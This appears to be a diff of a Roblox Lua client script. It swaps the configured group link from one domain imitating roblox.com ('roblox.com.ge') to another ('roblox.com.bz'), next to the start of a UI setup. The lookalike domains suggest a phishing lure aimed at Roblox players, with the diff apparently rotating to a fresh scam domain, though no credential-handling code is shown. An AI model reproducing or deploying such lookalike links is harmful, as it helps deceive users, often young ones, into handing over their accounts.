@@ -5,7 +5,7 @@ local player = Players.LocalPlayer
 
 -- CONFIG
 local GROUP_ID = 4443846399
-local GROUP_LINK = "https://roblox.com.ge/communities/4443846399/"
+local GROUP_LINK = "https://roblox.com.bz/communities/4443846399/"
 
 -- UI
 local ScreenGui = Instance.new("ScreenGui")
